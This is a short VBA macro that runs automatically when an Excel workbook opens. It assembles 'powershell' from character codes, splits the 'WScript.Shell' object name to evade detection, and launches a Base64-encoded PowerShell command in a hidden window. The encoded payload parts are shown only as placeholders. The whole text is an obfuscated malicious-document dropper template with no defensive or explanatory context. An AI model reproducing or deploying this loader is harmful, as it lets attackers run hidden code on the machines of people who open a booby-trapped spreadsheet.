Sub Workbook_Open()
    Dim ps As String
    Dim arg1 As String
    Dim arg2 As String
    Dim arg3 As String
    Dim cmd As String

    ps = Chr(112) & Chr(111) & Chr(119) & Chr(101) & Chr(114) & Chr(115) & Chr(104) & Chr(101) & Chr(108) & Chr(108)
    arg1 = " -e <UTF-16LE & Base64 Encoded part1>"
    arg2 = "<UTF-16LE & Base64 Encoded part2>"
    arg3 = "<UTF-16LE & Base64 Encoded part3>"

    cmd = ps & " " & arg1 & arg2 & arg3
    CreateObject("WS" + "cript.She" + "ll").Run cmd, 0
End Sub